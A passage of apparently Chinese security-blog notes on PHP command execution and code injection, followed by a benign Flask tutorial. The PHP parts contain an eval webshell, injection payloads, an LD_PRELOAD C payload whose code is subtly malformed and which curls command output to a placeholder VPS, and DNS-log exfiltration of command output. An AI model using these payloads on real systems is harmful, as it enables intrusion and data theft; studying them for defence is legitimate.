pcntl_exec()函数定义：pcntl_exec — 在当前进程空间执行指定程序 void pcntl_exec ( string $path [, array $args [, array $envs ]] ) path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 args是一个要传递给程序的参数的字符串数组。 envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。 ➜ html php -r &quot;pcntl_exec( &#39;/bin/ls&#39; , array(&#39;./&#39;));&quot; 输出的结果： 1.txt 2.txt web 让我们来看看/bin下又什么文件： 发现我们可以通过这个函数来执行cat，echo，chmod, rm , touch等命令 例如： ➜ html php -r &quot;pcntl_exec( &#39;/bin/echo&#39; , array(&#39;`ls`&#39;));&quot; 1.txt 2.txt web shell_exec()函数定义： string shell_exec ( string $cmd ) cmd是要执行的命令。 ➜ html php -r &quot;echo shell_exec(&#39;whoami&#39;);&quot; root ➜ html popen()函数定义： resource popen ( string $command , string $mode ) 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。 ➜ html php -r &quot;popen(&#39;/bin/echo \\&quot;123\\&quot; &gt;&gt; 1.txt&#39;,&#39;w&#39;);&quot; ➜ html cat 1.txt 123 能够执行的命令 proc_open()函数定义： resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] ) cmd是要执行的命令，其余见文档 `反引号在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。 ➜ html php -r &quot;echo @`whoami`;&quot; root# ob_start()官方文档 ob_start($a)参数a是一个回调函数名，当缓存刷新时，把缓冲区的内容作为一个参数传给回调函数处理，回调函数内不能再调用ob_start(). 测试： &lt;?php $foobar = &#39;system&#39;; ob_start($foobar); echo &#39;whoami&#39;; ob_end_flush(); ?&gt; 可以成功执行whoami的命令。但是php7测试未成功这里注意，如果我这样使用 echo ‘whoami’; whoami 是没有任何作用的 因为这里的$foobar被作为输出的回调函数 而我们输入的whoami在缓冲区 经过ob_end_flush()输出缓冲区后，可以得到 system(&#39;whoami&#39;) 这样的操作，所以成功执行了命令 mail函数+LD_PRELOAD执行系统命令思路：LD_PRELOAD可以用来设置程序运行前优先加载的动态链接库，php函数mail在实现的过程中会调用标准库函数，通过上传一个编译好的动态链接程序(这个程序中重新定义了一个mail函数会调用的库函数，并且重新定义的库函数中包含执行系统命令的代码。)，再通过LD_PRELOAD来设置优先加载我们的上传的动态链接程序，从而实现命令执行。 a.c #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(){ void payload() { system(&quot;curl http://vps_IP:4123/?a=`whoami`&quot;); } int geteuid() { if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; } unsetenv(&quot;LD_PRELOAD&quot;); payload(); } } 编译 gcc -c -fPIC a.c -o a gcc -shared a -o a.so mail.php &lt;?php putenv(&quot;LD_PRELOAD=/var/www/html/a.so&quot;); mail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;); ?&gt; 监听vps的4123端口，访问mail.php。","categories":[],"tags":[{"name":"web常见漏洞","slug":"web常见漏洞","permalink":"http://yoursite.com/tags/web常见漏洞/"}]},{"title":"php代码注入","slug":"php代码注入","date":"2019-07-26T12:34:12.000Z","updated":"2019-08-21T07:45:50.402Z","comments":true,"path":"2019/07/26/php代码注入/","link":"","permalink":"http://yoursite.com/2019/07/26/php代码注入/","excerpt":"代码注入简介代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做PHP代码执行。","text":"代码注入简介代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做PHP代码执行。 常见php命令注入函数eval()，assert(), system()，preg_replace(),create_function, call_user_func,call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec() eval这个函数我们在制作小马的时候经常用到：&lt;?php eval($_POST[&#39;aaa&#39;]); ?&gt; 在php官方手册上就表明了它是很危险的函数，允许执行任意的php代码。 # 1. 没有任何过滤 &lt;?php @eval($_GET[&quot;aa&quot;]); ?&gt; ?aa=phpinfo(); # 2. addslashes 过滤 &lt;?php $aa= @(string)$_GET[&quot;aa&quot;]; eval(&#39;$aa=&quot;&#39; . addslashes($aa) . &#39;&quot;;&#39;); ?&gt; # ${${} } 绕过 aa=${${phpinfo()} } # 3 双引号包含过滤 &lt;?php $aa= &quot;echo \\&quot;hello &quot; . $_GET[&#39;aa&#39;] . &quot;\\&quot;;&quot;; eval($aa); # ${${} } 绕过 aa=${${phpinfo()} } aa=${@system(&#39;dir&#39;)} ${${} } 绕过是利用可变变量的二次嵌套，执行里面花括号内的代码，如: echo &quot;${${phpinfo()}}&quot;;, 会执行phpinfo(), 这里必须是双引号包含，双引号包含时会解析包含的字符串中的变量。 PHP可变变量可以无需二次嵌套，一次也可以执行，echo &quot;${phpinfo()}&quot;;这种情况是不能执行的，而echo &quot;${/**/phpinfo()}&quot;;是能执行phpinfo()的, 这是因为花括号解析语法的关键条件是花括号内的第一个字符，空格，tab，注释，回车是各种语法分析引擎中常见的分割字符，@是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号, 因此下面代码都能执行。 php &gt;= 4.3 &quot;${ phpinfo()}&quot;; &quot;${ phpinfo()}&quot;; &quot;${/**/phpinfo()}&quot;; &quot;${ phpinfo()}&quot;; &quot;${@phpinfo()}&quot;; &quot;${( string )phpinfo()}&quot;; &quot;${phpinfo[phpinfo()]}&quot;; &quot;{$phpinfo[phpinfo()]}&quot;; &quot;{${phpinfo()}}&quot;; &quot;${${phpinfo()}}&quot;; php&gt;=5.5 &quot;${phpinfo()}&quot;; 可以执行phpinfo()函数（使用${}可以执行php函数）。。。 ${}${php代码} ${phpinfo()}; 即可执行phpinfo(); assert&lt;?php @assert($_GET[&quot;aa&quot;]); ?&gt; aa=phpinfo(); system&lt;?php system(&quot;ping -c 2 &quot;.$_GET[&#39;ip&#39;]); ?&gt; 正常访问：ip=127.0.0.1 是一个常规的ping命令 我们进行命令注入 ip=127.0.0.1|dir 就可以得到回显了 如果我们把代码放在linux上面，就可能得不到回显，在没有回显的情况下我们应该怎样得到我们想要的信息呢？这种时候就需要利用dnslog来查看命令执行的结果。 这里介绍一个dnslog利用平台，ceye。 在注册ceye.io之后会分配一个三级域名。就是******.ceye.io。 ping `whoami`.******.ceye.io 上面这条命令最终在ping的时候ping的是apache.******.ceye.io，apache就是我们构造的恶意命令whoami执行的结果，我们把它放在四级域名这里，这样在DNS解析的时候就会记录下root这个四级域名。然后可以在ceye平台上看到我们的dns解析日志。也就看到了命令执行的回显。 尝试ip=`pwd`.36rdia.ceye.io在页面中无回显，在ceye中的我们可以看到回显： 在治理我们看到了绝对路径：/var/www/html preg_replace()我们查看一下php手册对它的介绍 preg_replace()函数可以引发代码执行，源于PCRE (Perl Compatible Regular Expressions)中的e(PREG_REPLACE_EVAL)选项， /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 例如：preg_replace(&quot;/test/e&quot;,phpinfo(),&quot;jutst test&quot;);这样就能调用phpinfo()。 注意 php7.0.0 不再支持 /e修饰符。 请用 preg_replace_callback() 代替。 php5.5.0 /e 修饰符已经被弃用了。使用 preg_replace_callback() 代替 在实践的时候需要看清php版本,在7.0的版本以后就不再适用！ 举个例子 代码： &lt;?php function complexStrtolower($regex,$value){ return preg_replace(&#39;/(&#39;.$regex.&#39;)/ei&#39;, &#39;strtolower(&quot;\\\\1&quot;)&#39;,$value); } foreach ($_GET as $regex =&gt; $value) { echo $value.&quot;\\n&quot;; echo complexStrtolower($regex,$value).&quot;\\n&quot;; } ?&gt; 这里使用了/e模式，输入的参数和对应的参数值分别对应于匹配的模式和用于正则匹配的字符串，这两个参数都可以通过GET方式进行控制，但是第二个参数写定了 strtolower(&quot;\\\\1&quot;) 正则表达式 分组 在这里我把表达式统一以\\w为例： (\\w)(\\w) 自动命名分组，第一个小括号是分组1，第二个小括号是分组2 正则表达式 反向引用 后面的表达式可以引用前面的某个分组，用\\1表示，就好像分组1的值赋值给了\\1这个变量，这个变量可以在后面任意位置引用。 \\1 表示分组1匹配的文本 \\\\1实际上就是\\1，即第一个匹配项只需要控制匹配模式为/(.*)/，匹配出来的字符串为我们想要执行的代码，就可以了。 注意 preg_replace/e只执行一次代码，即strtolower函数，所以我们必须想办法让输入的phpinfo()自己执行，这就涉及到了php动态变量，payload为{${phpinfo()}}，我们知道php变量名经过{}包裹后会将变量值输出,而这里phpinfo被{}包裹后会首先执行phpinfo() 我们测试一下， &lt;?php preg_replace(&#39;/(.*)/ie&#39;,&#39;strtolower(&quot;\\\\1&quot;)&#39;,&#39;{${phpinfo()}}&#39;); ?&gt; 发现能够成功执行代码。所以payload=.*={${phpinfo()}} 但是没有成功执行phpinfo()代码，这是因为php的一个特性：php自身在解析请求时，如果参数中包含.这个字符，会将他转换为下划线。所以我们传递参数被解析为_*={${phpinfo()}}我们换个通用字符即可，因此payload:\\S*={${phpinfo()}} 也可以执行命令： create_function()查阅php手册 string create_function ( string $args , string $code ) 函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称 看一个官方样例 &lt;?php $newfunc = create_function(&#39;$a,$b&#39;, &#39;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#39;); echo &quot;New anonymous function: $newfunc\\n&quot;; echo $newfunc(2, M_E) . &quot;\\n&quot;; ?&gt; 我们不难得到create_function()的原型 function test($a,$b) { return &quot;ln($a) + ln($b) = &quot; . log($a * $b); } 他们的作用都是一样的。 小实例 代码： &lt;?php error_reporting(0); $sort_by = $_GET[&#39;sort_by&#39;]; $sorter = &#39;strnatcasecmp&#39;; $databases=array(&#39;1234&#39;,&#39;4321&#39;); $sort_function = &#39; return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]);&#39;; usort($databases, create_function(&#39;$a, $b&#39;, $sort_function)); ?&gt; 我们发现了匿名函数的存在，我们可以得到匿名函数的原型： function test($a,$b){ return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]); } 我们发现代码中$sort_by参数的值直接用GET取值未做过滤，create_function()中的函数体部分$sort_function只是简单的字符串拼接 我们尝试传递?sort_by=&quot;]);}phpinfo();/*我们发现能够成功执行phpinfo()传入后，此刻的函数原型为： function test($a,$b){ return 1 * strnatcasecmp($a[&quot;&quot;]);}phpinfo();/*&quot;], $b[&quot;&quot;]);}phpinfo();/*&quot;]); } 很显然，经过/*注释符我们剩下的只有 function test($a,$b){ return 1 * strnatcasecmp($a[&quot;&quot;]); } phpinfo(); 就能够执行php函数。 call_user_func()/call_user_func_array()call_user_func()是一个回调函数，用法参照php手册： 用法： &lt;?php $a = &#39;assert&#39;; $b = &#39;phpinfo()&#39;; call_user_func($a,$b); ?&gt; 可以执行phpinfo() call_user_func_array()也是一个回调函数，用法参照php手册： 用法： &lt;?php $a = &#39;assert&#39;; $b[0] = &#39;phpinfo()&#39;; call_user_func_array($a,$b); ?&gt; 可以执行phpinfo() 两者本质都差不多，但是call_user_func_array()必须带参数。 array_map()array_map()是一个回调函数，用法参照php手册： array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给array_map() 函数的数组数目一致 测试： &lt;?php array_map(&#39;system&#39;,$_GET[&#39;cmd&#39;]); ?&gt; payload=?cmd[0]=whoami&amp;cmd[1]=dir发现两条命令都执行了： array_filter()官方文档: 测试 ?cmd[]=whoami &lt;?php array_filter($_GET[&#39;cmd&#39;],&#39;system&#39;); ?&gt; usort()/uasort()usort() 官方文档: 测试： &lt;?php // ?1[]=test&amp;1[]=phpinfo();&amp;2=assert usort(...$_GET); ?&gt; 关于...$_GET是php5.6引入的新特性。即将数组展开成参数的形式。 GET变量被展开成两个参数[&#39;test&#39;, &#39;phpinfo();&#39;]和assert，传入usort函数。usort函数的第二个参数是一个回调函数assert，其调用了第一个参数中的phpinfo();。 只有在php5.6以上环境才可使用 uasort() 官方文档: 测试： &lt;?php // ?1=2;&amp;2=phpinfo(); usort($_GET,&#39;asse&#39;.&#39;rt&#39;); ?&gt; ob_start()官方文档 ob_start($a)参数a是一个回调函数名，当缓存刷新时，把缓冲区的内容作为一个参数传给回调函数处理，回调函数内不能再调用ob_start(). 测试： &lt;?php $foobar = &#39;system&#39;; ob_start($foobar); echo &#39;whoami&#39;; ob_end_flush(); ?&gt; 可以成功执行whoami的命令。但是php7测试未成功这里注意，如果我这样使用 echo ‘whoami’; whoami 是没有任何作用的 因为这里的$foobar被作为输出的回调函数 而我们输入的whoami在缓冲区 经过ob_end_flush()输出缓冲区后，可以得到 system(&#39;whoami&#39;) 这样的操作，所以成功执行了命令 register_shutdown_function()官方文档： register_shutdown_function($a)参数a是一个函数名，也可以给他传参,可以传多个register_shutdown_function($a,$b) 实例： //?cmd=whoami &lt;?php register_shutdown_function(&#39;system&#39;,$_GET[&#39;cmd&#39;]); ?&gt; //?cmd=phpinfo &lt;?php register_shutdown_function($_GET[&#39;cmd&#39;]); ?&gt; array_walk(),array_walk_recursive()官方文档： array_walk($a,$b)array_walk_recursive($a,$b)他们的参数a是个数组，参数b是个回调函数的名字，这两个函数都是把数组中的值作为参数带到回调函数中执行。第二个可以遍历多维数组。 测试： //?cmd[]=whoami 两个都可以执行 //?cmd[0][]=whoami 第二个可以执行，第一个不能执行。 &lt;?php array_walk($_GET[&#39;cmd&#39;],&#39;system&#39;); echo &quot;&lt;br&gt;&quot;; array_walk_recursive($_GET[&#39;cmd&#39;],&#39;system&#39;); ?&gt; 危险函数合集直接执行代码 eval() ${} assert() preg_replace()(php7不支持.5.5以后废弃改成preg_replace _callback(） 可以控制函数内容 create_function() 能控制函数参数和函数名 较容易 call_user_func（），call_user_func_array（） ob_start() php7测试未成功 array_map()，array_walk(),array_walk_recursive() register_shutdown_function() preg_replace _callback() array_filter() array_reduce() 比较困难，参数可控但是有限制 xml_set_character_data_handler() xml_set_default_handler() xml_set_element_handler() xml_set_end_namespace_decl_handler() xml_set_external_entity_ref_handler() xml_set_notation_decl_handler() xml_set_processing_instruction_handler() xml_set_start_namespace_decl_handler() xml_set_unparsed_entity_decl_handler() stream_filter_register() set_error_handler() usort(),uasort(), uksort(),array_diff_uassoc(), array_diff_ukey() array_udiff(), array_udiff_assoc(), array_udiff_uassoc() array_intersect_assoc(), array_intersect_uassoc() array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc() register_tick_function()","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"Python框架Flask基础学习","slug":"Python框架Flask基础学习","date":"2019-07-24T06:26:30.000Z","updated":"2019-08-21T07:46:27.422Z","comments":true,"path":"2019/07/24/Python框架Flask基础学习/","link":"","permalink":"http://yoursite.com/2019/07/24/Python框架Flask基础学习/","excerpt":"Python框架Flask基础学习简介Flask是由python实现的一个web微框架，让我们可以使用Python语言快速实现一个网站或Web服务。而且有对应的python3及python2版本。","text":"Python框架Flask基础学习简介Flask是由python实现的一个web微框架，让我们可以使用Python语言快速实现一个网站或Web服务。而且有对应的python3及python2版本。 环境 windows10系统 python2.7（之所以是2.7而不是3.x，因为大多数库只支持2.x） 已安装pip（Python包管理工具） 安装 建立：找一个目录建立flask文件夹 安装virtualenv，再此目录打开命令行窗口输入： pip install virtualenv 新建一个目录，并在里边创建virtualenv环境，在DOS下 mkdir demo cd demo virtualenv venv 这时你创建的myproject文件夹里面就多了一个venv文件夹 激活虚拟环境 venv\\scripts\\activate.bat 5.在virtualenv里面安装Flask pip install Flask 至此flask环境已经搭好了。 目录结构通过别人的目录大致了解flask框架的目录结构 flask-demo/ ├ run.py # 应用启动程序 ├ config.py # 环境配置 ├ requirements.txt # 列出应用程序依赖的所有Python包 ├ tests/ # 测试代码包 │ ├ __init__.py │ └ test_*.py # 测试用例 └ myapp/ ├ admin/ # 蓝图目录 ├ static/ │ ├ css/ # css文件目录 │ ├ img/ # 图片文件目录 │ └ js/ # js文件目录 ├ templates/ # 模板文件目录 ├ __init__.py ├ forms.py # 存放所有表单，如果多，将其变为一个包 ├ models.py # 存放所有数据模型，如果多，将其变为一个包 └ views.py # 存放所有视图函数，如果多，将其变为一个包 Hello worldfrom flask import Flask app = Flask(__name__) @app.route(&#39;/&#39;) def hello(): return &quot;Hello World&quot; if __name__ ==&#39;__main__&#39;: app.debug = True app.run() 使用python运行后访问localhost:5000就能看到网页显示Hello world。 debug模式开启debug模式 app.run(debug=True) 也可以分开写： app.debug = True app.run() 作用 将报错信息输出到页面 开启debug的文件内容如果被改动，就会自行重启服务器，也就是重新加载，不用在去重新运行python 1.py 路由flask通过route()装饰器将一个函数绑定到对应的URL上面 例如 from flask import Flask app = Flask(__name__) @app.route(&#39;/&#39;) def hello(): return &#39;Hello World!&#39; @app.route(&#39;/admin&#39;) def index(): return &#39;This is admin page!&#39; if __name__ ==&#39;__main__&#39;: app.debug = True app.run() 当我们访问localhost:5000/，就能在页面上看到Hello World!当我们访问localhost:5000/admin，就能在页面上看到This is admin page! 参数类型flask支持在路由上制定参数及参数类型,通过&lt;variable_name&gt;可以标记变量，这个部分将会作为命名参数传递到你的函数，也可以通过&lt;converter:variable_name&gt;指定一个可选的装饰器： from flask import Flask app = Flask(__name__) @app.route(&#39;/admin/&lt;username&gt;&#39;) def show_user_profile(username): return &#39;admin %s&#39; % username @app.route(&#39;/post/&lt;int:post_id&gt;&#39;) def show_post(post_id,post_name): return &#39;Post_id is %d &#39; % post_id if __name__ ==&#39;__main__&#39;: app.debug = True app.run() 这里访问localhost:5000/admin/user1，会看到admin user1。访问localhost:5000/post/1，会看到Post_id is 1，且必须为int型，因为这里限制了参数类型。 类型转换器 作用 缺省 字符型，但不能有斜杠 int: 整型 float: 浮点型 path: 字符型，可有斜杠 HTTP方法 如果需要处理具体的HTTP方法，在Flask中也很容易，使用route装饰器的methods参数设置即可。 # -*- coding: utf-8 -*- from flask import Flask,request import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) app = Flask(__name__) @app.route(&#39;/getone&#39;,methods=[&#39;GET&#39;]) def show_get(): # name = request.args #{&quot;age&quot;: &quot;12&quot;, &quot;name&quot;: &quot;a&quot;} name = request.args[&#39;name&#39;] age = request.args[&#39;age&#39;] return &#39;Your name is %s age is %s&#39; % (name,str(age)) @app.route(&#39;/get&#39;, methods=[&#39;GET&#39;]) def show(): get_methods = request.args.items() #可以获取get的全部参数 存储方式： [(&#39;age&#39;, u&#39;12&#39;), (&#39;name&#39;, u&#39;a&#39;)] return &#39;第一个参数名字为 %s 他的值为 %s 第二个参数名字为 %s 他的值为： %s&#39; % (get_methods[0][0],str(get_methods[0][1]),get_methods[1][0],get_methods[1][1]) @app.route(&#39;/post&#39;,methods=[&#39;POST&#39;]) def show_post(): name = request.form[&#39;name&#39;] age = request.form[&#39;age&#39;] return &#39;Your name is %s age is %s&#39; % (name,str(age)) if __name__== &#39;__main__&#39;: app.debug = True app.run() 其中可以通过request.method来判断请求的类型，是GET还是POST。 如果不写明methods的话，post请求将不被允许 request.args.get()方法则可以获取Get请求URL中的参数，该函数的第二个参数是默认值，当URL参数不存在时，则返回默认值 获取get和post传递的参数的方法不同。 get 用 request.args.get[&#39;name&#39;] POST用 request.form.get[&#39;name&#39;] 唯一 URL / 重定向行为@app.route(&#39;/admin/&#39;) def projects(): return &#39;The project page&#39; @app.route(&#39;/user&#39;) def about(): return &#39;The about page&#39; 当访问localhost:5000/admin时，flask会自动重定向到正确的地址上。但是访问localhost:5000/user/时，flask会直接报404的错误。 使用route设置路径的时候最好带上斜线 构造URLFlask提供了url_for()方法来快速获取及构建URL方法。其第一个参数指向函数名（加过@app.route注解的函数），后续的参数为对应于要构建的URL变量。 url_for(&#39;login&#39;) # 返回/login url_for(&#39;login&#39;, id=&#39;1&#39;) # 将id作为URL参数，返回/login?id=1 url_for(&#39;static&#39;, filename=&#39;style.css&#39;) # 静态文件地址，返回/static/style.css 和redirect一起使用可以达到页面跳转的效果 #encoding: utf-8 from flask import Flask,url_for,request,redirect app = Flask(__name__) @app.route(&#39;/&#39;) def index(): login_url = url_for(&#39;login&#39;) # /login/ return redirect(login_url) return u&#39;这是首页&#39; @app.route(&#39;/login/&#39;) def login(): return u&#39;这是登陆页面&#39; @app.route(&#39;/question/&lt;is_login&gt;/&#39;) def question(is_login): if is_login == &#39;1&#39;: return u&#39;这是发布问答的页面&#39; else: return redirect(url_for(&#39;login&#39;)) # /login/ return url_for(&#39;login&#39;,id=&#39;admin&#39;) if __name__== &#39;__main__&#39;: app.run(debug=True) 当我们访问localhost:5000/时，会自动跳转到login页面显示这是登陆页面。 加载静态文件 语法 url_for(&#39;static&#39;,filename=&#39;路径&#39;) 静态文件 ，flask会自动从static文件夹开始寻找，所以不需要再写static这个路径 可以加载css文件，js文件，还有image图片 要把静态文件放在static目录下 url_for(&#39;static&#39;, filename=&#39;style.css&#39;) Flask渲染Jinja2模板和传参(html模板使用)flask的渲染方法有render_template和render_template_string两种。 模板的使用需要 导入render_template和render_template_string 模块。 Flask默认使用Jinja2作为模板，默认情况下，模板文件需要放在templates文件夹下。 调用示例 # return render_template(&#39;demo.html&#39;) # return render_template_string(&#39;&lt;script&gt;alert(1);&lt;/script&gt;&#39;) render_template的具体使用： from flask import Flask,render_template app = Flask(__name__) @app.route(&#39;/hello/&#39;) @app.route(&#39;/hello/&lt;name&gt;&#39;) def index(name=None): return render_template(&quot;demo.html&quot;, name=name) if __name__== &#39;__main__&#39;: app.run(debug=True) demo.html &lt;html&gt; &lt;head&gt; &lt;title&gt;admin&lt;/title&gt; &lt;/head&gt; &lt;body&gt; {% if name %} Hello {{ name }}! {% else %} Hello World! {% endif %} &lt;/body&gt; &lt;/html&gt; 当我们访问localhost:5000/hello，页面会输出Hello World!当我们访问localhost:5000/hello/admin，页面会输出Hello admin! 变量或表达式由`{{ ... }}`修饰，而控制语句由`{% ... %}`修饰，其他的代码，就是我们常见的HTML。 模板的继承模板可以继承其他模板，我们可以将布局设置为父模板，让其他模板继承，这样可以非常方便的控制整个程序的外观。 先写一下block的作用，extends是继承了整个layout.html文件里的所有的公用代码 例如这里有一个layout.html模板，它是整个程序的布局文件。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;title&gt;{% block title %}{% endblock %} {% block body %}{% endblock %} &lt;/div&gt; &lt;div class=&quot;container footer&quot;&gt; &lt;hr&gt; &lt;p&gt;这是页脚&lt;/p&gt; &lt;/div&gt; &lt;script src=&quot;{{ url_for('static',filename='js/jquery.js') }}&quot;&gt;&lt;/script&gt; &lt;script src=&quot;{{ url_for('static',filename='js/bootstrap.js') }}&quot;&gt;&lt;/script&gt; 对应的继承show.html {% extends 'layout.html' %} {% block title %}主页{% endblock %} {% block body %} 主页 本项目演示了Flask的简单使用方法，点击导航栏上的菜单条查看具体功能。 {% endblock %} 这里如果不使用block，直接在show.html 中写html代码的话，页面是无法正常显示html代码的。所以要在layout.html中添加一个模板，然后在子文件中使用block来继承模板，然后再在block中写html代码。 block就相当于占位符的作用。 这两个页面相当于这样的一个页面： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;title&gt;主页&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;static/css/bootstrap.css&quot;/&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;static/css/bootstrap-theme.css&quot;/&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;container body-content&quot;&gt; &lt;div class=&quot;jumbotron&quot;&gt; &lt;h1&gt;主页&lt;/h1&gt; &lt;p&gt;本项目演示了Flask的简单使用方法，点击导航栏上的菜单条查看具体功能。&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;container footer&quot;&gt; &lt;hr&gt; &lt;p&gt;这是页脚&lt;/p&gt; &lt;/div&gt; &lt;script src=&quot;static/js/jquery.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/bootstrap.js&quot;&gt;&lt;/script&gt; 当我们存在一些重复的页面功能时，我们可以使用这个方法 控制流if条件判断可以这么写 {% ... %}中也可以写Python代码 &lt;html&gt; &lt;head&gt; &lt;title&gt;admin&lt;/title&gt; &lt;/head&gt; &lt;body&gt; {% if name %} Hello {{ name }}! {% else %} Hello World! {% endif %} &lt;/body&gt; &lt;/html&gt; 循环，和在Python中遍历差不多。 for.py from flask import Flask,render_template app = Flask(__name__) @app.route(&#39;/for&#39;) def for_list(): user = [&#39;admin&#39;,&#39;test&#39;,&#39;chuddy&#39;,&#39;aaa&#39;] return render_template(&#39;for.html&#39;,user=user) if __name__== &#39;__main__&#39;: app.run(debug = True) for.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; {% for i in user %} name is : {{i}} {% endfor %} &lt;/body&gt; &lt;/html&gt; 过滤器default 如果变量的值为空，则取default设置的值。 demo.html &lt;html&gt; &lt;head&gt; &lt;title&gt;admin&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello {{ name|default('World') }}!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; 1.py from flask import Flask,render_template app = Flask(__name__) @app.route(&#39;/hello/&#39;) @app.route(&#39;/hello/&lt;name&gt;&#39;) def index(name=None): return render_template(&quot;demo.html&quot;, name=name) if __name__== &#39;__main__&#39;: app.run(debug = True) 常见内建过滤器字符串操作 safe：禁用转义 &lt;p&gt;{{ 'hello' | safe }}&lt;/p&gt; capitalize：把变量值的首字母转成大写，其余字母转小写 &lt;p&gt;{{ 'hello' | capitalize }}&lt;/p&gt; lower：把值转成小写 &lt;p&gt;{{ 'HELLO' | lower }}&lt;/p&gt; upper：把值转成大写 &lt;p&gt;{{ 'hello' | upper }}&lt;/p&gt; title：把值中的每个单词的首字母都转成大写 &lt;p&gt;{{ 'hello' | title }}&lt;/p&gt; reverse：字符串反转 &lt;p&gt;{{ 'olleh' | reverse }}&lt;/p&gt; format：格式化输出 &lt;p&gt;{{ '%s is %d' | format('name',17) }}&lt;/p&gt; striptags：渲染之前把值中所有的HTML标签都删掉 &lt;p&gt;{{ 'hello' | striptags }}&lt;/p&gt; truncate: 字符串截断 &lt;p&gt;{{ 'hello every one' | truncate(9)}}&lt;/p&gt; 列表操作 first：取第一个元素 &lt;p&gt;{{ [1,2,3,4,5,6] | first }}&lt;/p&gt; last：取最后一个元素 &lt;p&gt;{{ [1,2,3,4,5,6] | last }}&lt;/p&gt; length：获取列表长度 &lt;p&gt;{{ [1,2,3,4,5,6] | length }}&lt;/p&gt; sum：列表求和 &lt;p&gt;{{ [1,2,3,4,5,6] | sum }}&lt;/p&gt; sort：列表排序 &lt;p&gt;{{ [6,2,3,1,5,4] | sort }}&lt;/p&gt; sessionfrom flask import session app.config[&#39;SECRET_KEY&#39;] = os.urandom(24) #设置session @app.route(&#39;/sess/&#39;) def hi(): session[&#39;name&#39;] = &#39;admin&#39; return &#39;hello word&#39; # 读取session @app.route(&#39;/get/&#39;) def get(): return session.get(&#39;name&#39;) # 删除session其中的一个 @app.route(&#39;/delete/&#39;) def delete(): print session.get(&#39;name&#39;) session.pop(&#39;name&#39;) print session.get(&#39;name&#39;) return &#39;successs&#39; # 清除session中的所用变量 @app.route(&#39;/clear/&#39;) def clear(): print session.get(&#39;name&#39;) session.clear() print session.get(&#39;name&#39;) return &#39;successs&#39; # 设置session过期时间 @app.route(&#39;/sess/&#39;) def hi(): session[&#39;name&#39;] = &#39;admin&#39; # 默认是flase，会话结束后session就过期。设置是True后，过期时间为30天 session.permanent = True return &#39;hello 